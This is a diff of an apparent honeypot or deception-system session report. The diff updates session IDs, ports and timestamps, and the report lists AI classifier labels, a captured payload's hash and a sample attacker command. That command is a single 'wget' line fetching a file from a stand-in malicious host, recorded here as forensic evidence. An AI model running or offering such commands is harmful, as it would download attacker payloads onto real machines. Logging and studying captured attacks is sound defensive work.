@@ -1,7 +1,7 @@
-# Latest Session Report — S-1762626543
-- Source: 127.0.0.1:51498
+# Latest Session Report — S-1762627149
+- Source: 127.0.0.1:50178
 - Events recorded: 7
-- Time window: 2025-11-08 23:59:03  to  2025-11-08 23:59:04
+- Time window: 2025-11-09 00:09:09  to  2025-11-09 00:09:10
 
 ## Classifier labels (AI outputs)
 - [CLASS]=exploit|0.9|ENG=HIGH
@@ -13,7 +13,7 @@
 - [HIGH_ENGAGEMENT]=END
 
 ## Payload captures (forensic evidence)
-- file: payload_handoff_1762626543.bin  size: 26  sha256: ed0d381831c7e7c671ebf05d67cfad06d85a2a06922c225e9f256f7a2e950516
+- file: payload_handoff_1762627149.bin  size: 26  sha256: ed0d381831c7e7c671ebf05d67cfad06d85a2a06922c225e9f256f7a2e950516
 
 ## Sample captured attacker commands
 - wget http://malicious.example/x
